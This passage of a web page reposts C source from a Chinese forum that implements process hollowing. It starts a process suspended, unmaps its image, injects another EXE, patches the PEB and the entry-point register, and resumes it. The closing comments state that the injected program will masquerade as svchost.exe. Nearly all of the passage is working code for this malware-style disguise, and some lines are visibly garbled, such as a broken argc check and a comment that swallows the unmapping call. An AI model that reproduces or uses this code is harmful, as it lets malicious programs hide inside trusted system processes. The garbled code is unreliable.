(DWORD)curAddr – (DWORD)outChildProcInfo-&gt;baseAddr;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return TRUE;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else{<br style="box-sizing: inherit;" />if(DebugActiveProcess((DWORD)*PID))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />WaitForDebugEvent(&amp;DBEvent,INFINITE);<br style="box-sizing: inherit;" />pi-&gt;hThread=DBEvent.u.CreateProcessInfo.hThread;<br style="box-sizing: inherit;" />pi-&gt;hProcess=DBEvent.u.CreateProcessInfo.hProcess;<br style="box-sizing: inherit;" />ctx-&gt;ContextFlags=CONTEXT_FULL;<br style="box-sizing: inherit;" />GetThreadContext(pi-&gt;hThread, ctx);<br style="box-sizing: inherit;" />pebInfo2 = (DWORD *)ctx-&gt;Ebp;<br style="box-sizing: inherit;" />*pebInfo2+=0x30;<br style="box-sizing: inherit;" />ReadProcessMemory(pi-&gt;hProcess, &amp;pebInfo2[2], (LPVOID)&amp;(outChildProcInfo2-&gt;baseAddr), sizeof(DWORD), &amp;read2);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">curAddr2 = outChildProcInfo2-&gt;baseAddr;<br style="box-sizing: inherit;" />while(VirtualQueryEx(pi-&gt;hProcess, (LPVOID)curAddr2, &amp;memInfo2, sizeof(memInfo2)))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(memInfo2.State == MEM_FREE)<br style="box-sizing: inherit;" />break;<br style="box-sizing: inherit;" />curAddr2+= memInfo2.RegionSize;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />outChildProcInfo2-&gt;imageSize = (DWORD)curAddr2 – (DWORD)outChildProcInfo2-&gt;baseAddr;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return TRUE;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return FALSE;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// Returns TRUE if the PE file has a relocation table<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">BOOL hasRelocationTable(PE_ExtHeader *inpeXH)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(inpeXH-&gt;relocationTableAddress &amp;&amp; inpeXH-&gt;relocationTableSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />return TRUE;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />return FALSE;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">typedef DWORD (WINAPI *PTRZwUnmapViewOfSection)(IN HANDLE ProcessHandle, IN PVOID BaseAddress);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//**********************************************************************************************************<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// To replace the original EXE with another one we do the following.<br style="box-sizing: inherit;" />// 1) Create the original EXE process in suspended mode.<br style="box-sizing: inherit;" />// 2) Unmap the image of the original EXE.<br style="box-sizing: inherit;" />// 3) Allocate memory at the baseaddress of the new EXE.<br style="box-sizing: inherit;" />// 4) Load the new EXE image into the allocated memory.<br style="box-sizing: inherit;" />// 5) Windows will do the necessary imports and load the required DLLs for us when we resume the suspended<br style="box-sizing: inherit;" />// thread.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// When the original EXE process is created in suspend mode, GetThreadContext returns these useful<br style="box-sizing: inherit;" />// register values.<br style="box-sizing: inherit;" />// EAX – process entry point<br style="box-sizing: inherit;" />// EBX – points to PEB<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />// So before resuming the suspended thread, we need to set EAX of the context to the entry point of the<br style="box-sizing: inherit;" />// new EXE.<br style="box-sizing: inherit;" />//<br style="box-sizing: inherit;" />//**********************************************************************************************************</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">void doFork(MZHeader *inMZ,<br style="box-sizing: inherit;" />PE_Header *inPE,<br style="box-sizing: inherit;" />PE_ExtHeader *inpeXH,<br style="box-sizing: inherit;" />SectionHeader *inSecHdr, LPVOID ptrLoc,DWORD imageSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />STARTUPINFO si = {0};<br style="box-sizing: inherit;" />PROCESS_INFORMATION pi;<br style="box-sizing: inherit;" />CONTEXT ctx;<br style="box-sizing: inherit;" />PROCINFO childInfo;<br style="box-sizing: inherit;" />LPVOID v;<br style="box-sizing: inherit;" />DWORD oldProtect;<br style="box-sizing: inherit;" />DWORD *pebInfo;<br style="box-sizing: inherit;" />DWORD wrote;<br style="box-sizing: inherit;" />PE_ExtHeader *peXH;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(createChild(&amp;pi, &amp;ctx, &amp;childInfo))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />pebInfo = (DWORD *)ctx.Ebx;<br style="box-sizing: inherit;" />printf(“Original EXE loaded (PID = %d).\n”, pi.dwProcessId);<br style="box-sizing: inherit;" />printf(“Original Base Addr = %X, Size = %X\n”, childInfo.baseAddr, childInfo.imageSize);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">v = (LPVOID)NULL;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(inpeXH-&gt;imageBase == childInfo.baseAddr &amp;&amp; imageSize &lt;= childInfo.imageSize)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />// if new EXE has same baseaddr and is its size is imageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br style="box-sizing: inherit;" />if(v)<br style="box-sizing: inherit;" />printf(“Unmapped and Allocated Mem for New EXE at %X\n”, (unsigned long)v);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(!v &amp;&amp; hasRelocationTable(inpeXH))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />// if unmap failed but EXE is relocatable, then we try to load the EXE at another<br style="box-sizing: inherit;" />// location<br style="box-sizing: inherit;" />v = VirtualAllocEx(pi.hProcess, (void *)NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br style="box-sizing: inherit;" />if(v)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Allocated Mem for New EXE at %X. EXE will be relocated.\n”, (unsigned long)v);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// we've got to do the relocation ourself if we load the image at another<br style="box-sizing: inherit;" />// memory location<br style="box-sizing: inherit;" />doRelocation(inMZ, inPE, inpeXH, inSecHdr, ptrLoc, (DWORD)v);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">printf(“EIP = %X\n”, ctx.Eip);<br style="box-sizing: inherit;" />printf(“EAX = %X\n”, ctx.Eax);<br style="box-sizing: inherit;" />printf(“EBX = %X\n”, ctx.Ebx); // EBX points to PEB<br style="box-sizing: inherit;" />printf(“ECX = %X\n”, ctx.Ecx);<br style="box-sizing: inherit;" />printf(“EDX = %X\n”, ctx.Edx);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(v)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“New EXE Image Size = %X\n”, imageSize);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// patch the EXE base addr in PEB (PEB + 8 holds process base addr)</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">WriteProcessMemory(pi.hProcess, &amp;pebInfo[2], &amp;v, sizeof(DWORD), &amp;wrote);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">// patch the base addr in the PE header of the EXE that we load ourselves<br style="box-sizing: inherit;" />peXH = (PE_ExtHeader *)((DWORD)inMZ-&gt;offsetToPE + sizeof(PE_Header) + (DWORD)ptrLoc);<br style="box-sizing: inherit;" />peXH-&gt;imageBase = (DWORD)v;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if(WriteProcessMemory(pi.hProcess, v, ptrLoc, imageSize, NULL))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“New EXE image injected into process.\n”);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">ctx.ContextFlags=CONTEXT_FULL;<br style="box-sizing: inherit;" />//ctx.Eip = (DWORD)v + ((DWORD)dllLoaderWritePtr – (DWORD)ptrLoc);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if((DWORD)v == childInfo.baseAddr)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />ctx.Eax = (DWORD)inpeXH-&gt;imageBase + inpeXH-&gt;addressOfEntryPoint; // eax holds new entry point<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />// in this case, the DLL was not loaded at the baseaddr, i.e. manual relocation was<br style="box-sizing: inherit;" />// performed.<br style="box-sizing: inherit;" />ctx.Eax = (DWORD)v + inpeXH-&gt;addressOfEntryPoint; // eax holds new entry point<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">printf(“********&gt; EIP = %X\n”, ctx.Eip);<br style="box-sizing: inherit;" />printf(“********&gt; EAX = %X\n”, ctx.Eax);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">SetThreadContext(pi.hThread,&amp;ctx);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">ResumeThread(pi.hThread);<br style="box-sizing: inherit;" />printf(“Process resumed (PID = %d).\n”, pi.dwProcessId);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“WriteProcessMemory failed\n”);<br style="box-sizing: inherit;" />TerminateProcess(pi.hProcess, 0);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Load failed. Consider making this EXE relocatable.\n”);<br style="box-sizing: inherit;" />TerminateProcess(pi.hProcess, 0);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Cannot load %s\n”, TARGETPROC);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">[/code]<br style="box-sizing: inherit;" />steve1993 发表于 2011-3-5 22:55</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">[code]</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">int main(int argc, char* argv[])<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />MZHeader mzH;<br style="box-sizing: inherit;" />PE_Header peH;<br style="box-sizing: inherit;" />PE_ExtHeader peXH;<br style="box-sizing: inherit;" />SectionHeader *secHdr;<br style="box-sizing: inherit;" />LPVOID ptrLoc;<br style="box-sizing: inherit;" />FILE *fp;</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">if((argc 3))<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“\nUsage: %s [pid]\n”, argv[0]);<br style="box-sizing: inherit;" />return 1;<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />if(argc==3){<br style="box-sizing: inherit;" />PID = malloc(1024);<br style="box-sizing: inherit;" />memset(PID,0,1024);<br style="box-sizing: inherit;" />strcpy(PID,argv[2]);<br style="box-sizing: inherit;" />EXPD= TRUE ;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fp = fopen(argv[1], “rb”);<br style="box-sizing: inherit;" />if(fp)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />if(readPEInfo(fp, &amp;mzH, &amp;peH, &amp;peXH, &amp;secHdr)) // 得到PE 结构<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />int imageSize = calcTotalImageSize(&amp;mzH, &amp;peH, &amp;peXH, secHdr); //得到文件占用的内存空间的大小<br style="box-sizing: inherit;" />printf(“Image Size = %X\n”, imageSize);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">ptrLoc = VirtualAlloc(NULL, imageSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //分配内存<br style="box-sizing: inherit;" />if(ptrLoc)<br style="box-sizing: inherit;" />{<br style="box-sizing: inherit;" />printf(“Memory allocated at %X\n”, ptrLoc);<br style="box-sizing: inherit;" />loadPE(fp, &amp;mzH, &amp;peH, &amp;peXH, secHdr, ptrLoc); //把文件加载到内存中</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">doFork(&amp;mzH, &amp;peH, &amp;peXH, secHdr, ptrLoc, imageSize);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />printf(“Allocation failed\n”);<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">fclose(fp);<br style="box-sizing: inherit;" />}<br style="box-sizing: inherit;" />else<br style="box-sizing: inherit;" />printf(“\nCannot open the EXE file!\n”);</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">return 0;<br style="box-sizing: inherit;" />}</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px 0px 1.6842em; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//使用方法 —-xx.exe 你要启动的程序名</p><p style="box-sizing: inherit; border: 0px; font-family: 'Noto Serif', serif; font-size: 19px; margin: 0px; outline: 0px; padding: 0px; vertical-align: baseline; color: rgb(51, 51, 51); line-height: 31.9998px;">//然后看系统进程，会发现多了一个svchost.exe的进程，而这个进程实际上你启动的那个程序</p>